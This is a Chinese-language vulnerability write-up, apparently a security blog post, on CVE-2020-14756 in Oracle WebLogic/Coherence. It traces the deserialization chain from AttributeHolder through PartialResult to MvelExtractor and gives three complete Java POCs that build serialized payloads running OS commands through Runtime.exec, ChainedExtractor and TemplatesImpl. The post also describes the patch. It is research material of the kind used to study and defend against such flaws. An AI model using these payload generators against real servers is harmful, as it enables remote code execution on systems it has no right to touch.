> 原文链接: https://www.anquanke.com//post/id/231436 


# CVE-2020-14756 详细分析


                                阅读量   
                                **121300**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p4.ssl.qhimg.com/t01ac3fc595305e2038.png)](https://p4.ssl.qhimg.com/t01ac3fc595305e2038.png)



## 影响版本

Oracle Weblogic Server 12.1.3.0.0, 12.2.1.3.0, 12.2.1.4.0, 14.1.1.0.0

其中12.1.3.0.0的利用链与12.2.1.3.0, 12.2.1.4.0, 14.1.1.0.0有所不同

先说这个洞思路不错的地方在于，通过一个实现了`Externalizable`接口的白名单类`AttributeHolder`对内部的数据流进行自定义反序列化`readExternal`操作，使后续的数据流在反序列化时没有经过`readObject()`黑名单检验，就能够利用之前的黑名单类进行攻击(例如作者利用的是CVE-2020-2555的sink)



## 环境搭建

```
version: '2'
services:
 weblogic:
   image: vulhub/weblogic:12.2.1.3-2018
   ports:
    - "7001:7001"
    - "8453:8453"
```

```
docker cp weblogic-12.2.1.3-8u151:/u01/oracle/user_projects/domains/base_domain/bin/setDomainEnv.sh ./setDomainEnv.sh
```

更改`local_debug`为true，本地`chomod +x`之后再cp进容器，否则没有权限

[![](https://p2.ssl.qhimg.com/t01c8172896bd4233a7.jpg)](https://p2.ssl.qhimg.com/t01c8172896bd4233a7.jpg)

```
docker cp ./setDomainEnv.sh weblogic-12.2.1.3-8u151:/u01/oracle/user_projects/domains/base_domain/bin/setDomainEnv.sh

docker cp weblogic-12.2.1.3-8u151:/u01/oracle ./weblogic12.2.1.3

find ./weblogic12.2.1.3 -name *.jar -exec cp `{``}` ./alllib/ \;
docker cp weblogic-12.2.1.3-8u151:/usr/java/jdk1.8.0_151 ./jdk
```



## ExternalizableLite接口

[![](https://p0.ssl.qhimg.com/t0101839089580e80e6.jpg)](https://p0.ssl.qhimg.com/t0101839089580e80e6.jpg)

`ExternalizableLite`接口定义了两个方法`readExternal`和`writeExternal`。凡是实现了`ExternalizableLite`的类，在这两个方法内部都借助`ExternalizableHelper`来进行自定义的序列化和反序列化。

例如`AttributeHolder`重写了自己的`writeExternal`，将内部变量`this.m_oValue`写入序列化的输出流

[![](https://p2.ssl.qhimg.com/t011e098d86599b8c9d.jpg)](https://p2.ssl.qhimg.com/t011e098d86599b8c9d.jpg)

[![](https://p3.ssl.qhimg.com/t0188970dca38e188b9.jpg)](https://p3.ssl.qhimg.com/t0188970dca38e188b9.jpg)

再例如`TopNAggregator.PartialResult`也重写了自己的`writeExternal`，将内部变量`this.m_comparator`写入序列化的输出流

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01ef26c6af948d70d9.jpg)

[![](https://p4.ssl.qhimg.com/t01637af6f09175c29b.jpg)](https://p4.ssl.qhimg.com/t01637af6f09175c29b.jpg)



## 漏洞分析

### <a class="reference-link" name="%E5%86%99%E5%9C%A8%E5%89%8D%E9%9D%A2"></a>写在前面

在反序列化时会判断实例所属的类是否实现了`Externalizable`接口

[![](https://p3.ssl.qhimg.com/t01d8ad50ad2559de32.jpg)](https://p3.ssl.qhimg.com/t01d8ad50ad2559de32.jpg)

如果实现了`Externalizable`或者`ExternalizableLite`接口，会调用实例自身的`readExternal`方法，这是一个自定义反序列化操作。这个漏洞所利用的类(AttributeHolder、PartialResult、MvelExtractor)都实现了`Externalizable`或者`ExternalizableLite`接口

```
public class AttributeHolder extends Base implements Externalizable

public static class PartialResult extends SortedBag implements ExternalizableLite

public class MvelExtractor extends AbstractExtractor implements ValueExtractor, ExternalizableLite

```

### <a class="reference-link" name="%E5%AF%BB%E6%89%BEsink"></a>寻找sink

由于第一个类`AttributeHodler`不在黑名单中，且其反序列化操作为`readExternalData`，主要作用是循环递归`ExternalizableLite`接口自定义的反序列化操作

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01e31e7a0b8aef0be6.jpg)

那只需要关注在递归过程中，每个`ExternalizableLiteImpl`在调用自定义`readExternal`还原数据流时是否有危险操作，且参数可控的情况。

首先作者的sink依然是利用`CVE-2020-2555`中，[@Lucifaer](https://github.com/Lucifaer)师傅挖掘的`Mvel`表达式注入

[![](https://p3.ssl.qhimg.com/t0178640e82220c99b8.jpg)](https://p3.ssl.qhimg.com/t0178640e82220c99b8.jpg)

通过`com.tangosol.coherence.rest.util.extractor.MvelExtractor`父类`com.tangosol.coherence.rest.util.extractor.AbstractExtractor`中的`compare`方法调用自身`extract`方法

[![](https://p5.ssl.qhimg.com/t01e5ee1b4327b5528b.jpg)](https://p5.ssl.qhimg.com/t01e5ee1b4327b5528b.jpg)

### <a class="reference-link" name="%E5%AF%BB%E6%89%BEgadget"></a>寻找gadget

在`com.tangosol.util.aggregator.TopNAggregatorc.PartialResult#readExternal`方法中调用了`instantiateInternalMap`方法，且`this.m_comparator`可在序列化时传入(攻击者可控)

[![](https://p1.ssl.qhimg.com/t01a30024099062fe98.jpg)](https://p1.ssl.qhimg.com/t01a30024099062fe98.jpg)

跟进`instantiateInternalMap`方法，创建了`TreeMap`对象，其`comparator`属性值为传入的`this.m_comparator`参数，同时攻击者可以构造输入流`in`来赋值`this.m_comparator`参数

[![](https://p0.ssl.qhimg.com/t013c7855d2aa2f075e.jpg)](https://p0.ssl.qhimg.com/t013c7855d2aa2f075e.jpg)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t012e8eb6813b9308ae.jpg)

将`instantiateInternalMap`函数的结果作为`this.m_map`属性值返回后，进入`this.add`函数

[![](https://p0.ssl.qhimg.com/t0170f3c60201fd6844.jpg)](https://p0.ssl.qhimg.com/t0170f3c60201fd6844.jpg)

但步入`this.add`函数之前，还需令`cElems`不为0，否则直接跳出循环。在追进`in.readInt()`的过程中发现，如果仅在`PartialResult`实例中写入`m_comparator`和`m_cMaxSize`两个数据流，那么`in.readInt();`获取的值为0，因为已经获取完`PartialResult`里的所有数据了。例如我们在序列化是令`m_cMaxSize=2`，则把`PartialResult`数据流读取到的buffer数据中后，最后一个值指向`m_cMaxSize`的值：2

[![](https://p4.ssl.qhimg.com/t011ba6d78ddcdbbade.jpg)](https://p4.ssl.qhimg.com/t011ba6d78ddcdbbade.jpg)

因此我们还要向`PartialResult`实例添加数据。我们去看它的对称写操作`writeExternal`：将`this.size()`写入输出流(实际上就是`TreeMap`的size)，由于默认建立的`TreeMap`而没有赋值导致size初值为0

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t018e04e9af4f7a0365.jpg)

获取`iter`也的过程，也就是在循环取`TreeMap`里的键值再写入输出流

[![](https://p1.ssl.qhimg.com/t01d1836666b304e436.jpg)](https://p1.ssl.qhimg.com/t01d1836666b304e436.jpg)

所以只需要往`TreeMap`里加个键值对就可以执行`this.add`方法。跟进`this.add`，调用`super.add(value)`

[![](https://p2.ssl.qhimg.com/t018fd3215cad91b18e.jpg)](https://p2.ssl.qhimg.com/t018fd3215cad91b18e.jpg)

继续跟进`super.add(value)`，进入`map.put`操作

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01ef56248d4f208352.jpg)

在`TreeMap.put`中调用了`TreeMap.compare`方法

[![](https://p0.ssl.qhimg.com/t010b1ec3b1c195c293.jpg)](https://p0.ssl.qhimg.com/t010b1ec3b1c195c293.jpg)

跟进`compare`方法，调用`this.f_comparator.compare(o1, o2)`

[![](https://p4.ssl.qhimg.com/t01886ca9549bdccc95.jpg)](https://p4.ssl.qhimg.com/t01886ca9549bdccc95.jpg)

在前面提到，我们在构造TreeMap时已经把`WrapperComparator.f_comparator`进行了赋值为`MvelExtractor`实例。此之我们已经能够调用`MvelExtractor.compare()`，且参数`o1`与`o2`序列化可控，整个gadget完整。

### <a class="reference-link" name="%E5%AF%BB%E6%89%BEsource"></a>寻找source

找到一个合理的source，能够衔接gadget的起点`PartialResult#readExternal()`.

作者选择的是`com.tangosol.coherence.servlet.AttributeHolder`，由于`AttributeHolder`实现了`Externalizable`接口，因此在反序列化的时候步入`readExternalData`来处理输入流。

[![](https://p4.ssl.qhimg.com/t01a716ec86c4320517.jpg)](https://p4.ssl.qhimg.com/t01a716ec86c4320517.jpg)

而`readExternalData`内部会调用`AttributeHolder#readExternal`继续处理输入流

[![](https://p4.ssl.qhimg.com/t0158745080dd620281.jpg)](https://p4.ssl.qhimg.com/t0158745080dd620281.jpg)

`read/WriteExternal`都是深度递归的过程，如果`AttributeHodler`属性中有`PartialResult`实例，则会继续调用`PartialResult#readExternal`，成功衔接到gadget起点



## 构造POC-逐步写OutObjectInput

在序列化的过程先解析第一个对象`AttributeHolder`，进入判断执行`writeExternalData`

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01510b1a957b80e65c.jpg)

`writeExternalData`内部调用`AttributeHolder#writeExternal()`。在上文讲`ExternalizableLite`接口时提到，凡事实现了`ExternalizableLite`接口的类都会自定义`writeExternal`来进行自己的序列化操作.

[![](https://p3.ssl.qhimg.com/t01124950925d5605af.jpg)](https://p3.ssl.qhimg.com/t01124950925d5605af.jpg)

`AttributeHolder#writeExternal`调用`ExternalizableHelper.writeObject(out, this.m_oValue)`，把自身变量`this.m_oValue`写入输出流。

此时我们令`this.m_oValue`为`com.tangosol.util.aggregator.TopNAggregatorc.PartialResult`，就可以在反序列化时使输入流`in`为`PartialResult`实例的流对象。到这里也可以看出来，`readExternal`和`writeExternal`是对称操作

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t014a6804782bd03ace.jpg)

在漏洞分析时我们提到要让`PartialResult.m_comparator`的值为`MvelExtractor`实例，那怎么向输出流中写入`PartialResult.m_comparator`呢？

步入`ExternalizableHelper.writeObject(out, this.m_oValue)`之后会发现这个`writeExternal`方法是深度递归的过程。它在判断`PartialResult`也是一个实现了`ExternalizableLite`的类后继续调用`PartialResult#writeExternal()`

[![](https://p4.ssl.qhimg.com/t011206ac08c3a9d6d9.jpg)](https://p4.ssl.qhimg.com/t011206ac08c3a9d6d9.jpg)

`PartialResult#writeExternal()`会调用`ExternalizableHelper.writeObject(out, this.m_comparator)`继续向输出流写入`PartialResult`内部属性`m_comparator`，这就帮我们解决了问题。我们只需创建实例后令`PartialResult.m_comparator=new MvelExtractor(xxx);`

[![](https://p3.ssl.qhimg.com/t01e8e286282f838f9b.jpg)](https://p3.ssl.qhimg.com/t01e8e286282f838f9b.jpg)

步入`ExternalizableHelper.writeObject(out, this.m_comparator)`，判断`this.m_comparator`也就是`MvelExtractor`也是实现了`ExternalizableLite`的类，继而再次递归调用`MvelExtractor#writeExternal`，把`this.m_sExpr`写入输出流

[![](https://p4.ssl.qhimg.com/t01c24ca436a5a7d0a6.jpg)](https://p4.ssl.qhimg.com/t01c24ca436a5a7d0a6.jpg)

至此，我们在漏洞分析中用到的所有变量都可以被写入输出流.



## POC-除12.1.3

```
package weblogic.t3;

import com.tangosol.coherence.rest.util.extractor.MvelExtractor;
import com.tangosol.coherence.servlet.AttributeHolder;
import com.tangosol.util.aggregator.TopNAggregator;

import java.io.*;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;

public class CVE_2020_14756 `{`

    public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, NoSuchFieldException `{`

        String mvel = "";
        MvelExtractor mvelExtractor = new MvelExtractor(mvel);


        TopNAggregator.PartialResult partialResult = new TopNAggregator.PartialResult(mvelExtractor,2);

        AttributeHolder attributeHolder = new AttributeHolder();
        Method setInternalValue = attributeHolder.getClass().getDeclaredMethod("setInternalValue",Object.class);
        setInternalValue.setAccessible(true);
        setInternalValue.invoke(attributeHolder,partialResult);

        partialResult.add(1);

        Field m_sExpr = mvelExtractor.getClass().getDeclaredField("m_sExpr");
        m_sExpr.setAccessible(true);

        String mvel1 = "Runtime.getRuntime().exec(\"touch /tmp/CVE_2020_14756\")";
        m_sExpr.set(mvelExtractor,mvel1);


        FileOutputStream fileOut =
                new FileOutputStream("cve_2020_14756.ser");
        // 建立对象输入流
        ObjectOutputStream out = new ObjectOutputStream(fileOut);
        //输出反序列化对象
        out.writeObject(attributeHolder);
        out.close();
        fileOut.close();

    `}`
`}`
```



## POC-12.1.3-局限

对于Weblogic 12.1.3，ClassLoader无法加载`MvelExtractor`，所以需要寻找其它的sink。但笔者比较菜，没有能够找到除了`MvelExtractor`之外能够调用`readExternal`接口来反序列化的黑名单sink。跟[@Hu3sky](https://github.com/Hu3sky)师傅讨论后，他用`ChainedExtractor`实现了12.1.3版本的RCE，我用的是`TemplatesImpl`进行了RCE；然而这两种方法中的`Runtime.class`与`TemplatesImpl.class`都在12.1.3上一个版本的黑名单中，因此以下的两个exp仍不能打黑名单下的Weblogic12.1.3，丢出来仅供学习和后续师傅们利用做参考

### <a class="reference-link" name="12.1.3-ChainedExtractor"></a>12.1.3-ChainedExtractor

```
package weblogic.t3;

import com.tangosol.coherence.reporter.extractor.ConstantExtractor;
import com.tangosol.coherence.servlet.AttributeHolder;
import com.tangosol.util.ValueExtractor;
import com.tangosol.util.aggregator.TopNAggregator;
import com.tangosol.util.extractor.ChainedExtractor;
import com.tangosol.util.extractor.ReflectionExtractor;

import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.lang.reflect.Method;

public class CVE_2020_14756_1213 `{`

    public static void main(String[] args) throws Exception`{`


        ValueExtractor[] fakeaExtractors = new ValueExtractor[]`{`
                new ConstantExtractor(null)
        `}`;


        //构造一个假的aExtractors数组，以便于add操作添加整数
        ChainedExtractor extractorChain = new ChainedExtractor(fakeaExtractors);


        TopNAggregator.PartialResult partialResult = new TopNAggregator.PartialResult(extractorChain);


        AttributeHolder attributeHolder = new AttributeHolder();
        Method setInternalValue = attributeHolder.getClass().getDeclaredMethod("setInternalValue",Object.class);
        setInternalValue.setAccessible(true);
        setInternalValue.invoke(attributeHolder,partialResult);



        ValueExtractor[] realaExtractors = new ValueExtractor[]`{`
                new ReflectionExtractor("getMethod", new Object[]`{`"getRuntime", null`}`),
                new ReflectionExtractor("invoke", new Object[]`{`null, null`}`),
                new ReflectionExtractor("exec", new Object[]`{`"touch /tmp/hpdoger"`}`)
        `}`;

        partialResult.add(Runtime.class);


        Field m_aExtractor = extractorChain.getClass().getSuperclass().getDeclaredField("m_aExtractor");
        m_aExtractor.setAccessible(true);
        m_aExtractor.set(extractorChain,realaExtractors);


        FileOutputStream fileOut =
                new FileOutputStream("/Users/Hpdata/JavaSecurity/POCs/Weblogic/CVE-2020-14756/cve_2020_14756_1213.ser");
        // 建立对象输入流
        ObjectOutputStream out = new ObjectOutputStream(fileOut);
        //输出反序列化对象
        out.writeObject(attributeHolder);
        out.close();
        fileOut.close();

//        FileInputStream fileIn = new FileInputStream("cve_2020_14756_1213.ser");
//        ObjectInputStream input = new ObjectInputStream(fileIn);
//        input.readObject();
    `}`
`}`
```

在初始化传入了`fakeaExtractors`，防止在`partialResult.add`操作时报错

[![](https://p4.ssl.qhimg.com/t0138d74217d61b4bad.jpg)](https://p4.ssl.qhimg.com/t0138d74217d61b4bad.jpg)

添加完add之后再调用反射重新对`ChainedExtractor`父类变量`m_aExtractor`赋值

[![](https://p0.ssl.qhimg.com/t01ee837aa2fd7e953e.jpg)](https://p0.ssl.qhimg.com/t01ee837aa2fd7e953e.jpg)

### <a class="reference-link" name="12.1.3-TemplatesImpl"></a>12.1.3-TemplatesImpl

```
package ysoserial.payloads;

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.tangosol.coherence.reporter.extractor.ConstantExtractor;
import com.tangosol.coherence.servlet.AttributeHolder;
import com.tangosol.util.ValueExtractor;
import com.tangosol.util.aggregator.TopNAggregator;
import com.tangosol.util.extractor.ChainedExtractor;
import com.tangosol.util.extractor.ReflectionExtractor;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.HashSet;
import ysoserial.payloads.util.Reflections;

import static ysoserial.payloads.util.Gadgets.createTemplatesImpl;

public class CVE_2020_14756_1213 `{`

    //还是不能bypass TemplatesImpl这个黑名单
    public static void main(String[] args) throws Exception`{`

        String cmd = "touch /tmp/hpdoger1213";

        final Object templates = createTemplatesImpl(cmd, TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class);

        ValueExtractor[] fakeaExtractors = new ValueExtractor[]`{`
                new ConstantExtractor(null)
        `}`;

        //构造一个假的aExtractors数组，以便于add操作添加整数
        ChainedExtractor extractorChain = new ChainedExtractor(fakeaExtractors);

        TopNAggregator.PartialResult partialResult = new TopNAggregator.PartialResult(extractorChain);


        AttributeHolder attributeHolder = new AttributeHolder();
        Method setInternalValue = attributeHolder.getClass().getDeclaredMethod("setInternalValue",Object.class);
        setInternalValue.setAccessible(true);
        setInternalValue.invoke(attributeHolder,partialResult);



        ValueExtractor[] realaExtractors = new ValueExtractor[]`{`
                new ReflectionExtractor("newTransformer")
        `}`;

        partialResult.add(templates);


        Field m_aExtractor = extractorChain.getClass().getSuperclass().getDeclaredField("m_aExtractor");
        m_aExtractor.setAccessible(true);
        m_aExtractor.set(extractorChain,realaExtractors);


        FileOutputStream fileOut =
                new FileOutputStream("cve_2020_14756_1213.ser");
        // 建立对象输入流
        ObjectOutputStream out = new ObjectOutputStream(fileOut);
        //输出反序列化对象
        out.writeObject(attributeHolder);
        out.close();
        fileOut.close();
    `}`
`}`
```

PS：学习yso的思路，如果在序列化时为了防止本地反射爆error，则可先调用toString()方法在初始化时伪装，之后再用反射赋值更改要invoke的方法

[![](https://p5.ssl.qhimg.com/t0155fb1df4d633695f.jpg)](https://p5.ssl.qhimg.com/t0155fb1df4d633695f.jpg)

[![](https://p5.ssl.qhimg.com/t016c4e0be0e5754ecf.jpg)](https://p5.ssl.qhimg.com/t016c4e0be0e5754ecf.jpg)



## 漏洞修补

coherence.jar补丁中，在`readExternalizableLite`方法中对反序列化的数据流调用`ObjectFilter`进行检测

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01f6cb7c9c9f792201.jpg)



## 参考链接

[安恒研究院](https://mp.weixin.qq.com/s/E-4wjbKD-iSi0CEMegVmZQ)
